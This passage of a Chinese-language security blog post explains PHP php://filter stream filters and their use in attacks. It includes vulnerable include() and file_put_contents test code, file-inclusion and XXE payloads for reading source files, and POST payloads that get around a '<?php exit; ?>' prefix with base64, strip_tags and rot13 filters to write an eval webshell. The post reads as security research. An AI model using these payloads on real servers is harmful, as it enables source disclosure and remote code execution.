+<span class="token keyword">echo</span> <span class="token string">'IGNORE   : '</span><span class="token punctuation">,</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span> "<span class="token constant">ISO</span><span class="token number">-8859</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">//IGNORE", $text), PHP_EOL;</span>
+<span class="token keyword">echo</span> <span class="token string">'Plain    : '</span><span class="token punctuation">,</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string">"ISO-8859-1"</span><span class="token punctuation">,</span> <span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/* Outputs:
+Original : This is the Euro symbol '€'.
+TRANSLIT : This is the Euro symbol 'EUR'.
+IGNORE   : This is the Euro symbol ''.
+Plain    :
+Notice: iconv(): Detected an illegal character in input string in .\iconv-example.php on line 7
+*/</span>
+
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>Example #3 convert.iconv.*</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'convert.iconv.utf-16le.utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs: This is a test. */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>支持的字符编码有一下几种（详细参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php" target="_blank" rel="noopener">官方手册</a>）</p>
+<pre><code>UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+、、、、、、、
+、、、、、、、</code></pre><p>Note</p>
+<pre><code>* 表示该编码也可以在正则表达式中使用。
+
+** 表示该编码自 PHP 5.4.0 始可用。</code></pre><h3 id="Compression-Filters"><a href="#Compression-Filters" class="headerlink" title="Compression Filters"></a>Compression Filters</h3><p>虽然 <a href="https://www.php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">压缩封装协议</a>提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p>
+<pre><code>Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</code></pre><p>zlib.* 压缩过滤器自 PHP 版本 <em>5.1.0</em>起可用，在激活 <a href="https://www.php.net/manual/zh/ref.zlib.php" target="_blank" rel="noopener">zlib</a>的前提下。也可以通过安装来自 <a href="https://pecl.php.net/" target="_blank" rel="noopener">» PECL</a>的 <a href="https://pecl.php.net/package/zlib_filter" target="_blank" rel="noopener">» zlib_filter</a>包作为一个后门在 <em>5.0.x</em>版中使用。此过滤器在 PHP 4 中 <em>不可用</em>。</p>
+<p>bzip2.* 压缩过滤器自 PHP 版本 <em>5.1.0</em>起可用，在激活 <a href="https://www.php.net/manual/zh/ref.bzip2.php" target="_blank" rel="noopener">bz2</a>支持的前提下。也可以通过安装来自 <a href="https://pecl.php.net/" target="_blank" rel="noopener">» PECL</a>的 <a href="https://pecl.php.net/package/bz2_filter" target="_blank" rel="noopener">» bz2_filter</a>包作为一个后门在 <em>5.0.x</em>版中使用。此过滤器在 PHP 4 中 <em>不可用</em>。</p>
+<p>详细细节参考官方文档</p>
+<pre><code>https://www.php.net/manual/zh/filters.compression.php</code></pre><h3 id="Encryption-Filters"><a href="#Encryption-Filters" class="headerlink" title="Encryption Filters"></a>Encryption Filters</h3><p>mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 <a href="https://www.php.net/manual/zh/ref.mcrypt.php" target="_blank" rel="noopener">mcrypt 扩展库</a>中相同的算法，格式为 <em>mcrypt.ciphername</em>，其中 <code>ciphername</code>是密码的名字，将被传递给 <a href="https://www.php.net/manual/zh/function.mcrypt-module-open.php" target="_blank" rel="noopener">mcrypt_module_open()</a>。有以下五个过滤器参数可用：</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403164504776-267152967.png" alt></p>
+<p>详细细节参考官方文档</p>
+<pre><code>https://www.php.net/manual/zh/filters.encryption.php</code></pre><p>在了解了有关<code>php://filter</code>的原理和利用之后，下面开始探索php://filter在漏洞挖掘中的奇妙之处。</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>文件包含漏洞顾名思义即：包含恶意代码或恶意内容达到一定的攻击效果。</p>
+<p>在文件包含漏洞当中，因为php://filter可以对所有文件进行编码处理，所以常常可以使用php://filter来包含读取一些特殊敏感的文件（配置文件、脚本文件等）以辅助后面的漏洞挖掘。</p>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>利用条件</strong>：无</p>
+<p><strong>利用姿势1</strong>：</p>
+<pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计。</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403170908346-892021805.png" alt></p>
+<p><strong>利用姿势2</strong>：</p>
+<pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，只是少了个read关键字，在绕过一些waf时也许有用。</p>
+<h1 id="XXE-Encode"><a href="#XXE-Encode" class="headerlink" title="XXE Encode"></a>XXE Encode</h1><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>XXE漏洞也就是XML外部实体注入漏洞，关于该漏洞造成的主要原因是libxml库【libxml2.9以前的版本默认支持并开启了外部实体的引用】，对于防范XXE漏洞也很简单：升级libxml版本、使用脚本语言自带的禁用xml外部实体解析。</p>
+<h2 id="XXE回显问题绕过"><a href="#XXE回显问题绕过" class="headerlink" title="XXE回显问题绕过"></a>XXE回显问题绕过</h2><p>在P牛<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">文章</a>里面有提到使用php://filter绕过xxe回显问题，详细细节和操作如下：</p>
+<p>大家都知道XXE漏洞和XML有关系，当存在XXE漏洞的时候，如果我们使用相关协议读取特殊文件（HTML、PHP等）就可能会报错<code>parser error : StartTag: invalid element name</code>，为什么会这样呢，主要是因为XML的文件格式（xml文件声明和html以及php文件一样都是基于标签的，正是因为这样在读取这些特殊文件的时候就会解析错误）。</p>
+<p>针对这种情况就可以使用php://filter协议来进行文件内容编码读取，避免和xml文件解析产生冲突。</p>
+<ul>
+<li>payload</li>
+</ul>
+<pre><code>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./xxe.php&quot; &gt;]&gt;</code></pre><h1 id="Bypass-file-put-contents-Exit"><a href="#Bypass-file-put-contents-Exit" class="headerlink" title="Bypass file_put_contents Exit"></a>Bypass file_put_contents Exit</h1><p>关于这段代码<code>&lt;?php exit; ?&gt;</code>想必大家在漏洞挖掘中写入shell的时候经常会遇到，在这样的情况下无论写入的shell是否成功都不会执行传入的恶意代码，因为在恶意代码执行之前程序就已经结束退出了，导致shell后门利用失败。</p>
+<p>实际漏洞挖掘当中主要会遇到以下两种限制：</p>
+<ul>
+<li>写入shell的文件名和内容不一样（前后变量不同）</li>
+<li>写入shell的文件名和内容一样（前后变量相同）</li>
+</ul>
+<p>针对以上不同的限制手法所利用的姿势与技巧也不太一样，不过原理都是一样的，都需要利用相应的编码解码操作绕过头部限制写入能解析的恶意代码。下面主要针对脚本里面的<code>exit</code>限制手段进行探索与绕过。</p>
+<h2 id="Bypass-不同变量"><a href="#Bypass-不同变量" class="headerlink" title="Bypass-不同变量"></a>Bypass-不同变量</h2><p>这种情况主要是针对写入shell的文件名和内容的变量不一样的时候进行探索绕过，其中的文件名主要是传入我们的php伪协议，而文件内容则传入我们精心构造的恶意数据，最终也就是通过php伪协议和内容数据进行相应的编码解码绕过自身的头部限制，使传入的恶意代码能够正常解析也就达到了目的。</p>
+<p>关于这种情景下的利用分析主要参考最早P牛16年发布的一篇文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a>，里面介绍了当写入shell并且内容可控的时候绕过<code>exit</code>头部限制，具体分析介绍如下：</p>
+<h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>分析代码可以看到，<code>$content</code>在开头增加了exit，导致文件运行直接退出！！</p>
+<p>在这种情况下该怎么绕过这个限制呢，思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。</p>
+<h3 id="Bypass-转换过滤器"><a href="#Bypass-转换过滤器" class="headerlink" title="Bypass-转换过滤器"></a>Bypass-转换过滤器</h3><p>在上面的介绍中我们知道<code>php://filter</code>中<code>convert.base64-encode</code>和<code>convert.base64-decode</code>使用这两个过滤器等同于分别用 <code>base64_encode()</code>和 <code>base64_decode()</code>函数处理所有的流数据。</p>
+<p>在代码中可以看到<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，既然可以控制协议，那么我们就可以使用php://filter协议的转换过滤器进行base64编码与解码来绕过限制。所以我们可以将<code>$content</code>内容进行解码，利用php base64_decode函数特性去除“exit”。</p>
+<h4 id="Base64编码与解码"><a href="#Base64编码与解码" class="headerlink" title="Base64编码与解码"></a>Base64编码与解码</h4><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
+<ul>
+<li><strong>base64索引表</strong></li>
+</ul>
+<p>base64编码与解码的基础索引表如下</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403174336933-328206147.png" alt></p>
+<ul>
+<li><strong>Base64编码原理</strong></li>
+</ul>
+<p>（1）base64编码过程</p>
+<p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
+<p>Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。</p>
+<p>由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。</p>
+<p>完整的Base64定义可见RFC1421和RFC2045。因为Base64算法是将3个字节原数据编码为4个字节新数据，所以Base64编码后的数据比原始数据略长，为原来的4/3。</p>
+<p>（2）简单编码流程</p>
+<pre><code>1）将所有字符转化为ASCII码；
+
+2）将ASCII码转化为8位二进制；
+
+3）将8位二进制3个归成一组(不足3个在后边补0)共24位，再拆分成4组，每组6位；
+
+4）将每组6位的二进制转为十进制；
+
+5）从Base64编码表获取十进制对应的Base64编码；</code></pre><p>下面举例对字符串<code>“ABCD”</code>进行base64编码：</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403174634931-1149915582.png" alt></p>
+<p>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。</p>
+<ul>
+<li><strong>Base64解码原理</strong></li>
+</ul>
+<p>（1）base64解码过程</p>
+<p>base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。</p>
+<p>（2）base64解码特点</p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。下面编写一个简单的代码，测试一组数据看是否满足我们所说的情况。</p>
+<p>测试代码</p>
+<p>探测base64_decode解码的特点</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">/**
+ * Created by PhpStorm.
+ * User: Qftm
+ * Date: 2020/3/17
+ * Time: 9:16
+ */</span>
+
+<span class="token variable">$basestr0</span><span class="token operator">=</span><span class="token string">"QftmrootQftm"</span><span class="token punctuation">;</span>
+<span class="token variable">$basestr1</span><span class="token operator">=</span><span class="token string">"Qftm#root@Qftm"</span><span class="token punctuation">;</span>
+<span class="token variable">$basestr2</span><span class="token operator">=</span><span class="token string">"Qftm^root&amp;Qftm"</span><span class="token punctuation">;</span>
+<span class="token variable">$basestr3</span><span class="token operator">=</span><span class="token string">"Qft>mro%otQftm"</span><span class="token punctuation">;</span>
+<span class="token variable">$basestr4</span><span class="token operator">=</span><span class="token string">"Qf%%%tmroo%%%tQftm"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$basestr0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$basestr1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$basestr2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$basestr3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$basestr4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行结果</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403173818784-839413852.png" alt></p>
+<p>从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><p>知道php base64解码特点之后，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 来首先对其解码。在解码的过程中，字符<code>&lt; ? ; &gt; 空格</code>等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p>
+<p>由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符<code>（Q）</code>就可以，这样”phpexitQ”被正常解码，而后面我们传入的webshell的base64内容也被正常解码，这样就会将<code>&lt;?php exit; ?&gt;</code>这部分内容给解码掉，从而不会影响我们写入的webshell。</p>
+<ul>
+<li>payload</li>
+</ul>
+<pre><code>http://192.33.6.145/test.php
+
+POST
+txt=QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php
+
+base64decode组成
+phpe xitQ PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403175247238-1855204858.png" alt></p>
+<p>从服务器上可以看到已经生成shell.php，同时<code>&lt;?php exit; ?&gt;</code>这部分已经被解码掉了。</p>
+<h3 id="Bypass-字符串过滤器"><a href="#Bypass-字符串过滤器" class="headerlink" title="Bypass-字符串过滤器"></a>Bypass-字符串过滤器</h3><p>除了可以使用php://filter的转换过滤器绕过以外还可以使用其字符串过滤器进行绕过利用。</p>
+<h4 id="string-strip-tags-1"><a href="#string-strip-tags-1" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h4><p>利用php://filter中<code>string.strip_tags</code>过滤器去除”exit”。使用此过滤器等同于用 strip_tags()函数处理所有的流数据。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>，实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它。</p>
+<ul>
+<li>测试代码</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=string.strip_tags/resource=php://input');</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>测试payload</li>
+</ul>
+<pre><code>php://filter/read=string.strip_tags/resource=php://input</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403175952194-1452981623.png" alt></p>
+<p>载荷利用虽然成功了，但是我们的目的是写入webshell，如果那样的话，我们的webshell岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（php://filter允许通过 <code>|</code> 使用多个过滤器）。</p>
+<ul>
+<li>具体步骤分析</li>
+</ul>
+<pre><code>1、webshell用base64编码   //为了避免strip_tags的影响
+
+2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;
+
+3、调用convert.base64-decode //这一步将还原base64编码的webshell</code></pre><ul>
+<li>payload</li>
+</ul>
+<pre><code>http://192.33.6.145/test.php
+
+POST
+txt=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403180333712-1693777699.png" alt></p>
+<p>从服务上可以看到已经生成shell.php，同时<code>&lt;?php exit; ?&gt;</code>这部分已经被<code>string.strip_tags</code>去除掉。</p>
+<p>在字符串过滤器中除了使用<code>string.strip_tags</code>Bypass外还可以使用<code>string.rot13</code>进行Bypass利用，下面通过分析了解其利用手法。</p>
+<h4 id="string-rot13-1"><a href="#string-rot13-1" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>在上面的php://filter讲解中，我们知道string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。</p>
+<ul>
+<li>str_rot13()</li>
+</ul>
+<pre><code>str_rot13() 函数对字符串执行 ROT13 编码。
+
+ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。
+
+编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。</code></pre><ul>
+<li>分析绕过</li>
+</ul>
+<p>分析利用php://filter中<code>string.rot13</code>过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除<code>exit</code>。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，不过这种利用手法的前提是PHP不开启<code>short_open_tag</code></p>
+<p>查看官方给的说明<a href="https://www.php.net/manual/zh/ini.core.php" target="_blank" rel="noopener">手册</a></p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403201015367-1051154795.png" alt></p>
+<pre><code>short_open_tag boolean
+
+决定是否允许使用 PHP 代码开始标志的缩写形式（&lt;? ?&gt;）。如果要和 XML 结合使用 PHP，可以禁用此选项以便于嵌入使用 &lt;?xml ?&gt;。否则还可以通过 PHP 来输出，例如：&lt;?php echo &#39;&lt;?xml version=&quot;1.0&quot;&#39;; ?&gt;。如果禁用了，必须使用 PHP 代码开始标志的完整形式（&lt;?php ?&gt;）。</code></pre><p>虽然官方手册指的默认开启，但是有关php.ini文件配置依据有三种方式：<code>默认配置</code>、<code>php.ini-development</code>和<code>php.ini-production</code>；<code>默认配置</code>即官方手册默认值、<code>php.ini-development</code>适合开发测试、<code>php.ini-production</code>拥有较高的安全性设定，适合产品上线使用；这三种配置方式皆为官方提供，查看php.ini配置信息，可发现关于每一项的取值有三种方式，分别对应上述三种情况：</p>
+<pre class="line-numbers language-ini"><code class="language-ini"><span class="token comment" spellcheck="true">; short_open_tag</span>
+<span class="token comment" spellcheck="true">;   Default Value: On</span>
+<span class="token comment" spellcheck="true">;   Development Value: Off</span>
+<span class="token comment" spellcheck="true">;   Production Value: Off</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>下载php源码，在根目录下可发现两类php配置文件</p>
+<p><img src="/2020/04/03/php-filter-tricks/image-20201026003734676.png" alt="image-20201026003734676"></p>
+<p>在Linux系统下，通过自带的包管理器安装PHP环境，会发现其使用的是<code>php.ini-production</code>安全配置。</p>
+<p><img src="/2020/04/03/php-filter-tricks/image-20201026005722683.png" alt="image-20201026005722683"></p>
+<p>查看一些默认项，对比<code>php.ini</code>、<code>php.ini-production</code>与<code>php.ini-development</code>的差异。</p>
+<p><img src="/2020/04/03/php-filter-tricks/image-20201026004429995.png" alt="image-20201026004429995"></p>
+<p>这就告诉我们，在php.ini配置文件中，所有的配置项都不一定是官方给出的默认值【一般出现默认项被修改，都是出现在安全配置项上】。</p>
+<p>在Linux系统中，查看php.ini的<code>short_open_tag</code>配置，不同于官方默认配置。</p>
+<pre class="line-numbers language-ini"><code class="language-ini"><span class="token comment" spellcheck="true">; short_open_tag</span>
+<span class="token comment" spellcheck="true">;   Default Value: On</span>
+<span class="token comment" spellcheck="true">;   Development Value: Off</span>
+<span class="token comment" spellcheck="true">;   Production Value: Off</span>
+
+<span class="token comment" spellcheck="true">; This directive determines whether or not PHP will recognize code between</span>
+<span class="token comment" spellcheck="true">; &lt;? and ?> tags as PHP source which should be processed as such. It is</span>
+<span class="token comment" spellcheck="true">; generally recommended that &lt;?php and ?> should be used and that this feature</span>
+<span class="token comment" spellcheck="true">; should be disabled, as enabling it may result in issues when generating XML</span>
+<span class="token comment" spellcheck="true">; documents, however this remains supported for backward compatibility reasons.</span>
+<span class="token comment" spellcheck="true">; Note that this directive does not control the &lt;?= shorthand tag, which can be</span>
+<span class="token comment" spellcheck="true">; used regardless of this directive.</span>
+<span class="token comment" spellcheck="true">; Default Value: On</span>
+<span class="token comment" spellcheck="true">; Development Value: Off</span>
+<span class="token comment" spellcheck="true">; Production Value: Off</span>
+<span class="token comment" spellcheck="true">; http://php.net/short-open-tag</span>
+<span class="token constant">short_open_tag</span> <span class="token attr-value"><span class="token punctuation">=</span> Off</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403222823478-1328403008.png" alt></p>
+<p>在Windows系统下，通过phpstudy安装的php环境，默认php.ini采用的是<code>php.ini-development</code>配置</p>
+<p><img src="/2020/04/03/php-filter-tricks/image-20201026010202865.png" alt="image-20201026010202865"></p>
+<ul>
+<li>payload</li>
+</ul>
+<pre><code>POST
+txt=&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php
+
+&lt;?php exit; ?&gt;      &lt;?cuc rkvg; ?&gt;
+
+&lt;?php @eval($_POST[Qftm])?&gt;   &lt;?cuc @riny($_CBFG[Dsgz])?&gt;</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403181011919-1274464224.png" alt></p>
+<p>从服务上可以看到已经生成shell.php，同时<code>&lt;?php exit; ?&gt;</code>这部分已经被<code>string.rot13</code>编码所处理掉了。</p>
+<p>针对相同变量的文件<code>exit</code>写入shell的绕过手法，除了上面这些方法绕过以外，关于php://filter其他的奇思妙想，感兴趣的还可以在进行探索发现。</p>
+<h2 id="Bypass-相同变量"><a href="#Bypass-相同变量" class="headerlink" title="Bypass-相同变量"></a>Bypass-相同变量</h2><p>这种情况主要是针对写入shell的文件名和内容的变量一样的时候进行探索绕过，这个时候文件名和内容就是同一个变量，而不像第一种方式那样可以比较容易的绕过，这种方式需要考虑文件名变量内容和文件内容数据的兼容性。</p>
+<p>关于这种情景下的利用分析主要参考最近安全圈的一些研究：</p>
+<ul>
+<li><p>4月份，安恒发布的一篇渗透测试文章<a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a>里面提到了使用<code>convert.iconv.UCS-xxx.UCS-xxx</code>转换器进行绕过【重点是字符串的单元组反转-&gt;导致本身正常的代码因编码转换而失效】。</p>
+</li>
+<li><p>4月份，P牛知识星球他所提到的一种手法使用<code>string.strip_tags|convert.base64-decode</code>进行绕过【重点是构造头部标签的闭合-&gt;恶意代码的编码-&gt;标签的剔除-&gt;恶意代码的解码】。</p>
+</li>
+<li><p>3月份，先知的一篇文章<a href="https://xz.aliyun.com/t/7457" target="_blank" rel="noopener">Thinkphp5.0反序列化链在Windows下写文件的方法</a>中提的使用<code>convert.iconv.utf-8.utf-7|convert.base64-decode</code>进行绕过【重点是编码之间的转换（编码特殊字符）-&gt;base64正常解码】。</p>
+</li>
+<li><p>3月份，先知的一篇文章<a href="https://xz.aliyun.com/t/7310" target="_blank" rel="noopener">关于 ThinkPHP5.0 反序列化链的扩展</a>中使用<code>string.strip_tags|convert.base64</code>进行绕过<code>&lt;?php exit(); ?&gt;</code>【重点是构造标签的闭合（闭合特殊字符）-&gt;恶意代码的编码-&gt;标签的剔除-&gt;恶意代码的解码】。</p>
+</li>
+<li><p>4月份，cyc1e师傅blog的一篇文章<a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">关于file_put_contents的一些小测试</a>里面也有很多技巧【重点里面写入正常文件名技巧这个思路很好：过滤器里面写入payload、<code>../</code>跨目录写入文件。其它也就是一些过滤器的组合使用进行绕过，思路和上面已有的文章一样】</p>
+</li>
+</ul>
+<p>具体分析介绍如下：</p>
